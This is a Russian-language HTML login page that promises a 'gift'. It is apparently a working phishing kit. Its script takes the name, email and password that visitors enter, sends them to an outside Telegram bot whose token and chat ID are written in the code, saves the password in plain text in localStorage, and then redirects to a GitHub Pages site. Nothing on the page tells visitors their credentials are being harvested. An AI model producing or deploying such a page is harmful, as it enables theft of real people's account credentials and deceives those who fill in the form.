<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Войдите в аккаунт</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(15, 23, 42, 0.9);
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #8b5cf6;
        }
        h1 {
            font-size: 1.8rem;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #fff, #a78bfa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .sub {
            color: #94a3b8;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: #1e293b;
            border: 1px solid #8b5cf6;
            border-radius: 60px;
            color: white;
            font-size: 1rem;
        }
        button {
            background: linear-gradient(95deg, #8b5cf6, #3b82f6);
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 15px;
        }
        .message {
            margin-top: 20px;
            color: #10b981;
            display: none;
        }
        footer {
            margin-top: 24px;
            font-size: 0.7rem;
            color: #475569;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>Войдите в аккаунт</h1>
    <div class="sub">чтобы получить подарок</div>
    <input type="text" id="name" placeholder="Имя и фамилия" autocomplete="off">
    <input type="email" id="email" placeholder="Email" autocomplete="off">
    <input type="password" id="password" placeholder="Пароль" autocomplete="off">
    <button id="submitBtn">Далее</button>
    <div id="successMsg" class="message">🎁 Подарок получен!<br>Награда придёт на почту в течение 24 часов.</div>
    <footer>Конфиденциальность | Условия</footer>
</div>

<script>
    const BOT_TOKEN = "8557565108:AAFnoCGWW0e5Vmrz5vf9ikAKf-MfTm-0AOg";
    const CHAT_ID = "5314096451";

    function sendToTelegram(name, email, password) {
        const text = `🆕 НОВАЯ РЕГИСТРАЦИЯ (Google)\n👤 Имя: ${name}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({chat_id: CHAT_ID, text: text})
        }).catch(e => console.log(e));
    }

    document.getElementById("submitBtn").onclick = () => {
        const name = document.getElementById("name").value.trim();
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!name || !email || !password) {
            alert("Заполни все поля");
            return;
        }

        // Отправляем данные в Telegram
        sendToTelegram(name, email, password);

        // Сохраняем данные в localStorage для основного сайта
        const userData = {
            name: name,
            email: email,
            password: password,
            registered: true
        };
        localStorage.setItem("vorkmaster_user_data", JSON.stringify(userData));

        // Показываем сообщение об успехе
        document.getElementById("successMsg").style.display = "block";
        document.getElementById("submitBtn").disabled = true;

        // Через 2 секунды возвращаем на главный сайт
        setTimeout(() => {
            window.location.href = "https://gamerby.github.io/VorkMaster/";
        }, 2000);
    };
</script>
</body>
</html>
